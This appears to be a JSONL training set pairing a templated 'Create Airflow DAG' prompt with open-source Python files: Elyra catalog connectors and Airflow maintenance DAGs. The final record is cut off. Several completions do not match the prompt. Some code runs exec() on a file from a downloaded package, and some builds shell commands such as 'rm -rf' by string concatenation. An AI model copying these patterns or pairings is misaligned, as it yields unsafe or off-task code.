{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport json\nimport logging\nfrom pathlib import Path\nfrom typing import Dict\nfrom typing import List\n\nfrom elyra.metadata.schema import SchemasProvider\n\n\nclass AirflowPackageSchemasProvider(SchemasProvider):\n    \"\"\"\n    Enables catalog connector for Apache Airflow providers.\n    \"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        \"\"\"\n        Return the Apache Airflow package catalog connector schema\n        \"\"\"\n        # use Elyra logger\n        log = logging.getLogger(\"ElyraApp\")\n        catalog_schema_defs = []\n        try:\n            # load catalog schema definition\n            catalog_connector_schema_file = Path(__file__).parent / \"airflow-package-catalog.json\"\n            log.debug(f\"Reading Airflow package catalog connector schema from {catalog_connector_schema_file}\")\n            with open(catalog_connector_schema_file, \"r\") as fp:\n                catalog_connector_schema = json.load(fp)\n                catalog_schema_defs.append(catalog_connector_schema)\n        except Exception as ex:\n            log.error(\n                \"Error reading Airflow package catalog connector \" f\"schema {catalog_connector_schema_file}: {ex}\"\n            )\n\n        return catalog_schema_defs\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/package_catalog_connector/airflow_package_schema_provider.py", "language": "python", "complexity": "simple", "star_count": 1942, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport ast\nimport os\nfrom os.path import sep\nfrom pathlib import Path\nimport re\nimport shutil\nfrom tempfile import mkdtemp\nfrom typing import Any\nfrom typing import Dict\nfrom typing import List\nfrom typing import Optional\nfrom urllib.parse import urlparse\nimport zipfile\n\nfrom requests import session\nfrom requests.auth import HTTPBasicAuth\n\nfrom elyra.pipeline.catalog_connector import AirflowEntryData\nfrom elyra.pipeline.catalog_connector import ComponentCatalogConnector\nfrom elyra.pipeline.catalog_connector import EntryData\nfrom elyra.util.url import FileTransportAdapter\nfrom elyra.util.url import get_verify_parm\n\n\nclass AirflowProviderPackageCatalogConnector(ComponentCatalogConnector):\n    \"\"\"\n    Read component definitions from an Apache Airflow provider package archive\n    \"\"\"\n\n    REQUEST_TIMEOUT = 30\n\n    def get_catalog_entries(self, catalog_metadata: Dict[str, Any]) -> List[Dict[str, Any]]:\n        \"\"\"\n        Download the user-defined Apache Airflow provider package and search for Python\n        scripts that contain one or more operator definitions.\n\n        :param catalog_metadata: Contains the catalog connector configuration information.\n        :returns: List of Python scripts that contain one or more operator definitions.\n        \"\"\"\n\n        # Return data structure contains a list of operators that are defined\n        # in the referenced Apache Airflow provider package wheel\n        operator_key_list = []\n\n        # Read the user-defined 'airflow_provider_package_download_url', which is a required\n        # input defined in the 'airflow-provider-package-catalog-catalog.json' schema file.\n        # Example value: https://files.pythonhosted.org/packages/a3/57/443a4fb0a52dcfc93bcd410e5c661d5683a8a651914934e490613460713f/apache_airflow_providers_amazon-2.6.0-py3-none-any.whl # noqa: E501\n        airflow_provider_package_download_url = catalog_metadata[\"airflow_provider_package_download_url\"].strip()\n        # extract the package name, e.g. 'apache_airflow_providers_amazon-2.6.0-py3-none-any.whl'\n        airflow_provider_package_name = Path(urlparse(airflow_provider_package_download_url).path).name\n        # extract the provider name, e.g. 'apache_airflow_providers_amazon'\n        m = re.match(\"[^-]+\", airflow_provider_package_name)\n        if m:\n            airflow_provider_name = m.group(0)\n        else:\n            airflow_provider_name = airflow_provider_package_name\n\n        if not airflow_provider_name:\n            self.log.error(\n                f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                \"is not configured properly. \"\n                f\"The provider package download URL '{airflow_provider_package_download_url}' \"\n                \"does not include a file name.\"\n            )\n            return operator_key_list\n\n        pr = urlparse(airflow_provider_package_download_url)\n        auth = None\n\n        if pr.scheme != \"file\":\n            # determine whether authentication needs to be performed\n            auth_id = catalog_metadata.get(\"auth_id\")\n            auth_password = catalog_metadata.get(\"auth_password\")\n            if auth_id and auth_password:\n                auth = HTTPBasicAuth(auth_id, auth_password)\n            elif auth_id or auth_password:\n                self.log.error(\n                    f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    \"is not configured properly. \"\n                    \"Authentication requires a user id and password or API key.\"\n                )\n                return operator_key_list\n\n        # tmp_archive_dir is used to store the downloaded archive and as working directory\n        if hasattr(self, \"tmp_archive_dir\"):\n            # if the directory exists remove it in case the archive content has changed\n            shutil.rmtree(self.tmp_archive_dir.name, ignore_errors=True)\n        self.tmp_archive_dir = Path(mkdtemp())\n\n        try:\n            self.log.debug(f\"Downloading provider package from '{airflow_provider_package_download_url}' ...\")\n\n            # download archive\n            try:\n                requests_session = session()\n                if pr.scheme == \"file\":\n                    requests_session.mount(\"file://\", FileTransportAdapter())\n                response = requests_session.get(\n                    airflow_provider_package_download_url,\n                    timeout=AirflowProviderPackageCatalogConnector.REQUEST_TIMEOUT,\n                    allow_redirects=True,\n                    auth=auth,\n                    verify=get_verify_parm(),\n                )\n            except Exception as ex:\n                self.log.error(\n                    f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue downloading '{airflow_provider_package_download_url}': {ex}\"\n                )\n                return operator_key_list\n\n            if response.status_code != 200:\n                # download failed. Log error and abort processing\n                self.log.error(\n                    f\"Error. The Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue downloading '{airflow_provider_package_download_url}'. \"\n                    f\"HTTP response code: {response.status_code}\"\n                )\n                return operator_key_list\n\n            # save downloaded archive\n            archive = str(self.tmp_archive_dir / airflow_provider_package_name)\n            self.log.debug(f\"Saving downloaded archive in '{archive}' ...\")\n            with open(archive, \"wb\") as archive_fh:\n                archive_fh.write(response.content)\n\n            # extract archive\n            self.log.debug(f\"Extracting Airflow provider archive '{archive}' ...\")\n            try:\n                with zipfile.ZipFile(archive, \"r\") as zip_ref:\n                    zip_ref.extractall(self.tmp_archive_dir)\n            except Exception as ex:\n                self.log.error(\n                    f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"encountered an issue extracting downloaded archive '{archive}': \"\n                    f\"{ex}\"\n                )\n                os.remove(archive)\n                return operator_key_list\n\n            # delete archive\n            self.log.debug(f\"Deleting downloaded Airflow provider archive '{archive}' ...\")\n            os.remove(archive)\n\n            # Locate 'get_provider_info.py' in the extracted archive.\n            # It identifies Python modules that contain operator class definitions.\n            pl = list(self.tmp_archive_dir.glob(\"**/get_provider_info.py\"))\n            if len(pl) != 1:\n                # No such file or more than one file was found. Cannot proceed.\n                self.log.error(\n                    f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"is not configured properly. The archive '{archive}' \"\n                    f\"contains {len(pl)} file(s) named 'get_provider_info.py'.\"\n                )\n                # return empty list\n                return operator_key_list\n            get_provider_info_file_location = pl[0]\n\n            # extract module names from get_provider_info.py\n            with open(get_provider_info_file_location, \"r\") as gpi_file:\n                f = gpi_file.read()\n            namespace = {}\n            exec(f, namespace)\n            try:\n                # try to run the 'get_provider_info' method\n                return_dict = namespace[\"get_provider_info\"]()\n            except KeyError:\n                # no method with this name is defined in get_provider_info.py\n                self.log.error(\n                    f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"cannot invoke ' get_provider_info' method in '{get_provider_info_file_location}'.\"\n                )\n                return operator_key_list\n\n            python_scripts = []\n            for operator_entry in return_dict.get(\"operators\", []):\n                for m in operator_entry[\"python-modules\"]:\n                    python_scripts.append(f'{m.replace(\".\", sep)}.py')\n            if len(python_scripts) == 0:\n                self.log.warning(\n                    f\"Warning. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                    f\"'{airflow_provider_package_name}' does not include any operator definitions.\"\n                )\n                return operator_key_list\n\n            #\n            # Identify Python scripts that define classes that extend the\n            # airflow.models.BaseOperator class\n            #\n            scripts_with_operator_class: List[str] = []  # Python scripts that contain operator definitions\n            extends_baseoperator: List[str] = []  # Classes that extend BaseOperator\n            classes_to_analyze = {}\n            imported_operator_classes: List[str] = []  # Imported operator classes\n            # Process each Python script ...\n            for script in python_scripts:\n                self.log.debug(f\"Parsing '{script}' ...\")\n                with open(self.tmp_archive_dir / script, \"r\") as source_code:\n                    # parse source code\n                    tree = ast.parse(source_code.read())\n                    # Process imports and class definitions\n                    for node in ast.walk(tree):\n                        if isinstance(node, ast.Import):\n                            # Ignore imports (e.g. 'import airflow') for now\n                            # as they appear to be not used (based on a sampling\n                            # of several provider packages)\n                            pass\n                        elif isinstance(node, ast.ImportFrom):\n                            # example: 'from airflow.models import BaseOperator'\n                            node_module = node.module\n                            for name in node.names:\n                                self.log.debug(f\"Detected an IMPORT FROM: {node_module} -> {name.name}\")\n                                if \"airflow.models\" == node_module and name.name == \"BaseOperator\":\n                                    imported_operator_classes.append(name.name)\n                                else:\n                                    # Look for package imports that match one of the following patters:\n                                    #  - airflow.providers.*.operators.\n                                    #  - airflow.operators.*\n                                    # Add the associated class names to imported_operator_classes\n                                    m_patterns = [r\"airflow\\.providers\\.[a-z_]+\\.operators\", r\"airflow\\.operators\\.\"]\n                                    for pattern in m_patterns:\n                                        match = re.match(pattern, node_module)\n                                        if match:\n                                            imported_operator_classes.append(name.name)\n                                            break\n                        elif isinstance(node, ast.ClassDef):\n                            # Determine whether this class extends the BaseOperator class\n                            # based on previously identified imports\n                            class_node = node\n                            self.log.debug(f\"Analyzing class '{class_node.name}' in {script} ...\")\n                            # determine whether class extends one of the imported operator classes\n                            if len(class_node.bases) == 0:\n                                # This class does not extend other classes. It therefore cannot be\n                                # an operator implementation. Proceed.\n                                continue\n                            extends = False\n                            for base in class_node.bases:\n                                if isinstance(base, ast.Name):\n                                    key = base.id\n                                elif isinstance(base, ast.Attribute):\n                                    key = f\"{base.value.id}.{base.attr}\"\n                                self.log.debug(f\"Class {class_node.name} extends {key}\")\n                                if key in imported_operator_classes:\n                                    # This class extends the Airflow BaseOperator.\n                                    extends = True\n                                    # Add class to list of classes that extend BaseOperator\n                                    extends_baseoperator.append(class_node.name)\n                                    if script not in scripts_with_operator_class:\n                                        scripts_with_operator_class.append(script)\n                                    break\n                            if extends is False:\n                                # Further analysis is required after all imports\n                                # and classes were processed.\n                                classes_to_analyze[class_node.name] = {\"node\": class_node, \"file\": script}\n\n            # Initial analysis is completed. Repeat analysis for\n            # for classes in 'classes_to_analyze', as they might extend\n            # class that was previousl identified as an operator class.\n            # For example:\n            #  class MyBaseOperator(BaseOperator) -> identified in initial analysis\n            #  class MyOperator(MyBaseOperator)\n            analysis_complete = len(classes_to_analyze) == 0\n            while analysis_complete is False:\n                # assume that analysis is complete until proven otherwise\n                analysis_complete = True\n                for class_name in list(classes_to_analyze.keys()):\n                    script_name = classes_to_analyze[class_name][\"file\"]\n                    self.log.debug(f\"Re-analyzing class '{class_name}' in \" f\"'{script_name}'... \")\n                    for base in classes_to_analyze[class_name][\"node\"].bases:\n                        if isinstance(base, ast.Name):\n                            key = base.id\n                        elif isinstance(base, ast.Attribute):\n                            key = f\"{base.value.id}.{base.attr}\"\n                        if key in extends_baseoperator:\n                            # this class extends BaseOperator\n                            extends_baseoperator.append(class_name)\n                            if script_name not in scripts_with_operator_class:\n                                scripts_with_operator_class.append(script_name)\n                            # remove class from 'classes_to_analyze'\n                            del classes_to_analyze[class_name]\n                            # A new class was discovered that implements\n                            # BaseOperator. Analysis needs to be repeated because\n                            # OTHER classes might extend THIS class.\n                            analysis_complete = False\n                            break\n\n            # Populate return data structure\n            for script in scripts_with_operator_class:\n                operator_key_list.append(\n                    {\n                        \"provider_package\": airflow_provider_package_name,\n                        \"provider\": airflow_provider_name,\n                        \"file\": script,\n                    }\n                )\n\n            self.log.debug(f\"Operator key list: {operator_key_list}\")\n\n            # Dump stats\n            self.log.debug(\n                f\"Analysis of '{airflow_provider_package_download_url}' completed. \"\n                f\"Located {len(extends_baseoperator)} operator class(es) \"\n                f\"in {len(python_scripts)} Python script(s).\"\n            )\n\n        except Exception as ex:\n            self.log.error(\n                f\"Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                \"encountered an issue processing operator list in \"\n                f\"'{airflow_provider_package_download_url}': {ex}\"\n            )\n\n        return operator_key_list\n\n    def get_entry_data(\n        self, catalog_entry_data: Dict[str, Any], catalog_metadata: Dict[str, Any]\n    ) -> Optional[EntryData]:\n        \"\"\"\n        Fetch the script identified by catalog_entry_data['file']\n\n        :param catalog_entry_data: a dictionary that contains the information needed to read the content\n                                   of the component definition\n        :param catalog_metadata: the metadata associated with the catalog in which this catalog entry is\n                                 stored; in addition to catalog_entry_data, catalog_metadata may also be\n                                 needed to read the component definition for certain types of catalogs\n        :returns: An AirflowEntryData containing the definition and metadata, if found\n        \"\"\"\n\n        operator_file_name = catalog_entry_data[\"file\"]\n\n        if hasattr(self, \"tmp_archive_dir\") is False:\n            # This method was invoked before 'get_catalog_entries'. Therefore\n            # there is nothing that can be done. Log error and return None\n            self.log.error(\n                f\"Error. Airflow provider package connector '{catalog_metadata.get('display_name')}' \"\n                \"encountered an issue reading the operator source: The downloaded file was not found.\"\n            )\n            return None\n\n        # Compose package name from operator_file_name, e.g.\n        # 'airflow/providers/ssh/operators/ssh.py' => 'airflow.providers.ssh.operators.ssh'\n        package = \".\".join(Path(operator_file_name).with_suffix(\"\").parts)\n\n        # load operator source using the provided key\n        operator_source = self.tmp_archive_dir / operator_file_name\n        self.log.debug(f\"Reading operator source '{operator_source}' ...\")\n        try:\n            with open(operator_source, \"r\") as source:\n                return AirflowEntryData(definition=source.read(), package_name=package)\n        except Exception as ex:\n            self.log.error(\n                f\"Error. Airflow package connector '{catalog_metadata.get('display_name')}' \"\n                f\"encountered an issue reading operator source '{operator_source}': {ex}\"\n            )\n\n        return None\n\n    @classmethod\n    def get_hash_keys(cls) -> List[Any]:\n        \"\"\"\n        Instructs Elyra to use the specified keys to generate a unique\n        hash value for item returned by get_catalog_entries\n\n        :returns: a list of keys\n        \"\"\"\n        # Example key values:\n        # - provider: 'apache_airflow_providers_ssh'\n        # - file: 'airflow/providers/ssh/operators/ssh.py'\n        return [\"provider\", \"file\"]\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/provider_package_catalog_connector/airflow_provider_package_catalog_connector.py", "language": "python", "complexity": "complex", "star_count": 1942, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport json\nimport logging\nfrom pathlib import Path\nfrom typing import Dict\nfrom typing import List\n\nfrom elyra.metadata.schema import SchemasProvider\n\n\nclass AirflowProviderPackageSchemasProvider(SchemasProvider):\n    \"\"\"\n    Enables catalog connector for Apache Airflow provider packages.\n    \"\"\"\n\n    def get_schemas(self) -> List[Dict]:\n        \"\"\"\n        Return the Apache Airflow provider package catalog connector schema\n        \"\"\"\n        # use Elyra logger\n        log = logging.getLogger(\"ElyraApp\")\n        catalog_schema_defs = []\n        try:\n            # load catalog schema definition\n            catalog_connector_schema_file = Path(__file__).parent / \"airflow-provider-package-catalog.json\"\n            log.debug(\n                \"Reading Airflow provider package catalog connector \" f\"schema from '{catalog_connector_schema_file}'\"\n            )\n            with open(catalog_connector_schema_file, \"r\") as fp:\n                catalog_connector_schema = json.load(fp)\n                catalog_schema_defs.append(catalog_connector_schema)\n        except Exception as ex:\n            log.error(\n                \"Error reading Airflow provider package catalog connector \"\n                f\"schema '{catalog_connector_schema_file}': {ex}\"\n            )\n\n        return catalog_schema_defs\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "elyra/pipeline/airflow/provider_package_catalog_connector/airflow_provider_package_schema_provider.py", "language": "python", "complexity": "simple", "star_count": 1942, "quality_score": 0.84, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically take\nbackups of various Airflow configurations and files.\n\nairflow trigger_dag airflow-backup-configs\n\n\"\"\"\nfrom airflow.models import DAG, Variable\nfrom airflow.operators.python_operator import PythonOperator\nfrom airflow.configuration import conf\nfrom datetime import datetime, timedelta\nimport os\nimport airflow\nimport logging\nimport subprocess\n# airflow-backup-configs\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\n# How often to Run. @daily - Once a day at Midnight\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# Who is listed as the owner of this DAG in the Airflow Web Server\nSCHEDULE_INTERVAL = \"@daily\"\n# List of email address to send email alerts to if this job fails\nDAG_OWNER_NAME = \"operations\"\nALERT_EMAIL_ADDRESSES = []\n# Format options: https://www.tutorialspoint.com/python/time_strftime.htm\nBACKUP_FOLDER_DATE_FORMAT = \"%Y%m%d%H%M%S\"\nBACKUP_HOME_DIRECTORY = Variable.get(\"airflow_backup_config__backup_home_directory\", \"/tmp/airflow_backups\")\nBACKUPS_ENABLED = {\n    \"dag_directory\": True,\n    \"log_directory\": True,\n    \"airflow_cfg\": True,\n    \"pip_packages\": True\n}\n# How many backups to retain (not including the one that was just taken)\nBACKUP_RETENTION_COUNT = 7\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\n\ndef print_configuration_fn(**context):\n    logging.info(\"Executing print_configuration_fn\")\n\n    logging.info(\"Loading Configurations...\")\n    BACKUP_FOLDER_DATE = datetime.now().strftime(BACKUP_FOLDER_DATE_FORMAT)\n    BACKUP_DIRECTORY = BACKUP_HOME_DIRECTORY + \"/\" + BACKUP_FOLDER_DATE + \"/\"\n\n    logging.info(\"Configurations:\")\n    logging.info(\n        \"BACKUP_FOLDER_DATE_FORMAT:    \" + str(BACKUP_FOLDER_DATE_FORMAT)\n    )\n    logging.info(\"BACKUP_FOLDER_DATE:           \" + str(BACKUP_FOLDER_DATE))\n    logging.info(\"BACKUP_HOME_DIRECTORY:        \" + str(BACKUP_HOME_DIRECTORY))\n    logging.info(\"BACKUP_DIRECTORY:             \" + str(BACKUP_DIRECTORY))\n    logging.info(\n        \"BACKUP_RETENTION_COUNT:       \" + str(BACKUP_RETENTION_COUNT)\n    )\n    logging.info(\"\")\n\n    logging.info(\"Pushing to XCom for Downstream Processes\")\n    context[\"ti\"].xcom_push(\n        key=\"backup_configs.backup_home_directory\",\n        value=BACKUP_HOME_DIRECTORY\n    )\n    context[\"ti\"].xcom_push(\n        key=\"backup_configs.backup_directory\",\n        value=BACKUP_DIRECTORY\n    )\n    context[\"ti\"].xcom_push(\n        key=\"backup_configs.backup_retention_count\",\n        value=BACKUP_RETENTION_COUNT\n    )\n\n\nprint_configuration_op = PythonOperator(\n    task_id='print_configuration',\n    python_callable=print_configuration_fn,\n    provide_context=True,\n    dag=dag)\n\n\ndef execute_shell_cmd(cmd):\n    logging.info(\"Executing Command: `\" + cmd + \"`\")\n    proc = subprocess.Popen(cmd, shell=True, universal_newlines=True)\n    proc.communicate()\n    exit_code = proc.returncode\n    if exit_code != 0:\n        exit(exit_code)\n\n\ndef delete_old_backups_fn(**context):\n    logging.info(\"Executing delete_old_backups_fn\")\n\n    logging.info(\"Loading Configurations...\")\n    BACKUP_HOME_DIRECTORY = context[\"ti\"].xcom_pull(\n        task_ids=print_configuration_op.task_id,\n        key='backup_configs.backup_home_directory'\n    )\n    BACKUP_RETENTION_COUNT = context[\"ti\"].xcom_pull(\n        task_ids=print_configuration_op.task_id,\n        key='backup_configs.backup_retention_count'\n    )\n\n    logging.info(\"Configurations:\")\n    logging.info(\"BACKUP_HOME_DIRECTORY:    \" + str(BACKUP_HOME_DIRECTORY))\n    logging.info(\"BACKUP_RETENTION_COUNT:   \" + str(BACKUP_RETENTION_COUNT))\n    logging.info(\"\")\n\n    if BACKUP_RETENTION_COUNT < 0:\n        logging.info(\n            \"Retention is less then 0. Assuming to allow infinite backups. \"\n            \"Skipping...\"\n        )\n        return\n\n    backup_folders = [\n        os.path.join(BACKUP_HOME_DIRECTORY, f)\n        for f in os.listdir(BACKUP_HOME_DIRECTORY)\n        if os.path.isdir(os.path.join(BACKUP_HOME_DIRECTORY, f))\n    ]\n    backup_folders.reverse()\n    logging.info(\"backup_folders: \" + str(backup_folders))\n    logging.info(\"\")\n\n    cnt = 0\n    for backup_folder in backup_folders:\n        logging.info(\n            \"cnt = \" + str(cnt) + \", backup_folder = \" + str(backup_folder)\n        )\n        if cnt > BACKUP_RETENTION_COUNT:\n            logging.info(\"Deleting Backup Folder: \" + str(backup_folder))\n            execute_shell_cmd(\"rm -rf \" + str(backup_folder))\n        cnt += 1\n\n\ndelete_old_backups_op = PythonOperator(\n    task_id='delete_old_backups',\n    python_callable=delete_old_backups_fn,\n    provide_context=True,\n    dag=dag)\n\n\ndef general_backup_fn(**context):\n    logging.info(\"Executing general_backup_fn\")\n\n    logging.info(\"Loading Configurations...\")\n    PATH_TO_BACKUP = context[\"params\"].get(\"path_to_backup\")\n    TARGET_DIRECTORY_NAME = context[\"params\"].get(\"target_directory_name\")\n    BACKUP_DIRECTORY = context[\"ti\"].xcom_pull(\n        task_ids=print_configuration_op.task_id,\n        key='backup_configs.backup_directory'\n    )\n\n    logging.info(\"Configurations:\")\n    logging.info(\"PATH_TO_BACKUP:           \" + str(PATH_TO_BACKUP))\n    logging.info(\"TARGET_DIRECTORY_NAME:    \" + str(TARGET_DIRECTORY_NAME))\n    logging.info(\"BACKUP_DIRECTORY:         \" + str(BACKUP_DIRECTORY))\n    logging.info(\"\")\n\n    execute_shell_cmd(\"mkdir -p \" + str(BACKUP_DIRECTORY))\n\n    execute_shell_cmd(\n        \"cp -r -n \" + str(PATH_TO_BACKUP) + \" \" + str(BACKUP_DIRECTORY) +\n        (TARGET_DIRECTORY_NAME if TARGET_DIRECTORY_NAME is not None else \"\")\n    )\n\n\ndef pip_packages_backup_fn(**context):\n    logging.info(\"Executing pip_packages_backup_fn\")\n\n    logging.info(\"Loading Configurations...\")\n\n    BACKUP_DIRECTORY = context[\"ti\"].xcom_pull(\n        task_ids=print_configuration_op.task_id,\n        key='backup_configs.backup_directory'\n    )\n\n    logging.info(\"Configurations:\")\n    logging.info(\"BACKUP_DIRECTORY:     \" + str(BACKUP_DIRECTORY))\n    logging.info(\"\")\n    if not os.path.exists(BACKUP_DIRECTORY):\n        os.makedirs(BACKUP_DIRECTORY)\n    execute_shell_cmd(\"pip freeze > \" + BACKUP_DIRECTORY + \"pip_freeze.out\")\n\n\nif BACKUPS_ENABLED.get(\"dag_directory\"):\n    backup_op = PythonOperator(\n        task_id='backup_dag_directory',\n        python_callable=general_backup_fn,\n        params={\"path_to_backup\": conf.get(\"core\", \"DAGS_FOLDER\")},\n        provide_context=True,\n        dag=dag)\n    print_configuration_op.set_downstream(backup_op)\n    backup_op.set_downstream(delete_old_backups_op)\n\nif BACKUPS_ENABLED.get(\"log_directory\"):\n    try:\n        BASE_LOG_FOLDER = conf.get(\"core\", \"BASE_LOG_FOLDER\")\n    except Exception as e:\n        BASE_LOG_FOLDER = conf.get(\"logging\", \"BASE_LOG_FOLDER\")\n\n    backup_op = PythonOperator(\n        task_id='backup_log_directory',\n        python_callable=general_backup_fn,\n        params={\n            \"path_to_backup\": BASE_LOG_FOLDER,\n            \"target_directory_name\": \"logs\"\n        },\n        provide_context=True,\n        dag=dag)\n    print_configuration_op.set_downstream(backup_op)\n    backup_op.set_downstream(delete_old_backups_op)\n\nif BACKUPS_ENABLED.get(\"airflow_cfg\"):\n    backup_op = PythonOperator(\n        task_id='backup_airflow_cfg',\n        python_callable=general_backup_fn,\n        params={\n            \"path_to_backup\": (os.environ.get('AIRFLOW_HOME') if os.environ.get('AIRFLOW_HOME') is not None else \"~/airflow/\") + \"/airflow.cfg\"\n        },\n        provide_context=True,\n        dag=dag)\n    print_configuration_op.set_downstream(backup_op)\n    backup_op.set_downstream(delete_old_backups_op)\n\nif BACKUPS_ENABLED.get(\"pip_packages\"):\n    backup_op = PythonOperator(\n        task_id='backup_pip_packages',\n        python_callable=pip_packages_backup_fn,\n        provide_context=True,\n        dag=dag)\n    print_configuration_op.set_downstream(backup_op)\n    backup_op.set_downstream(delete_old_backups_op)\n", "metadata": {"source": "github.com/teamclairvoyant/airflow-maintenance-dags", "file_path": "backup-configs/airflow-backup-configs.py", "language": "python", "complexity": "complex", "star_count": 1731, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nA maintenance workflow that you can deploy into Airflow to periodically clean out entries in the DAG table of which there is no longer a corresponding Python File for it. This ensures that the DAG table doesn't have needless items in it and that the Airflow Web Server displays only those available DAGs.\n\nairflow trigger_dag airflow-clear-missing-dags\n\n\"\"\"\nfrom airflow.models import DAG, DagModel\nfrom airflow.operators.python_operator import PythonOperator\nfrom airflow import settings\nfrom datetime import timedelta\nimport os\nimport os.path\nimport socket\nimport logging\nimport airflow\n\n\n# airflow-clear-missing-dags\nDAG_ID = os.path.basename(__file__).replace(\".pyc\", \"\").replace(\".py\", \"\")\nSTART_DATE = airflow.utils.dates.days_ago(1)\n# How often to Run. @daily - Once a day at Midnight\nSCHEDULE_INTERVAL = \"@daily\"\n# Who is listed as the owner of this DAG in the Airflow Web Server\nDAG_OWNER_NAME = \"operations\"\n# List of email address to send email alerts to if this job fails\nALERT_EMAIL_ADDRESSES = []\n# Whether the job should delete the logs or not. Included if you want to\n# temporarily avoid deleting the logs\nENABLE_DELETE = True\n\ndefault_args = {\n    'owner': DAG_OWNER_NAME,\n    'depends_on_past': False,\n    'email': ALERT_EMAIL_ADDRESSES,\n    'email_on_failure': True,\n    'email_on_retry': False,\n    'start_date': START_DATE,\n    'retries': 1,\n    'retry_delay': timedelta(minutes=1)\n}\n\ndag = DAG(\n    DAG_ID,\n    default_args=default_args,\n    schedule_interval=SCHEDULE_INTERVAL,\n    start_date=START_DATE,\n    tags=['teamclairvoyant', 'airflow-maintenance-dags']\n)\nif hasattr(dag, 'doc_md'):\n    dag.doc_md = __doc__\nif hasattr(dag, 'catchup'):\n    dag.catchup = False\n\n\ndef clear_missing_dags_fn(**context):\n\n    logging.info(\"Starting to run Clear Process\")\n\n    try:\n        host_name = socket.gethostname()\n        host_ip = socket.gethostbyname(host_name)\n        logging.info(\"Running on Machine with Host Name: \" + host_name)\n        logging.info(\"Running on Machine with IP: \" + host_ip)\n    except Exception as e:\n        print(\"Unable to get Host Name and IP: \" + str(e))\n\n    session = settings.Session()\n\n    logging.info(\"Configurations:\")\n    logging.info(\"enable_delete:            \" + str(ENABLE_DELETE))\n    logging.info(\"session:                  \" + str(session))\n    logging.info(\"\")\n\n    dags = 